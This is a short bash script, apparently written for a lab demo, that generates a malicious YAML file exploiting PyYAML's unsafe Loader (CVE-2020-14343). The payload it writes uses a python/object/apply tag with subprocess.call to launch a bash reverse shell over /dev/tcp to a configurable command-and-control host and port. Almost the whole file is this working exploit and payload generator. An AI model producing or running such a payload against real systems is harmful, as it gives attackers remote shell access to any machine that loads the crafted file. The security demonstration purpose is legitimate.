#!/usr/bin/env bash
# Generates the evil diagnostic-profile.yaml payload for the PyYAML CVE demo.
# Run this on demo-attacker before the demo.
#
# Usage: ./generate-evil-profile.sh [c2-host] [c2-port]
#   c2-host: defaults to demo-c2.local
#   c2-port: defaults to 4444

C2_HOST="${1:-demo-c2.local}"
C2_PORT="${2:-4444}"

cat > "$(dirname "$0")/evil-profile.yaml" <<YAML
# CVE-2020-14343 demo payload — PyYAML unsafe Loader deserialization
# This YAML will execute a reverse shell when loaded with yaml.Loader.
# Lab demo use only.
$(printf '!!python/object/apply:subprocess.%s\n- [bash, -c, "bash -i >& /dev/tcp/%s/%s 0>&1"]' "call" "$C2_HOST" "$C2_PORT")
YAML

echo "[*] evil-profile.yaml written (C2: ${C2_HOST}:${C2_PORT})"
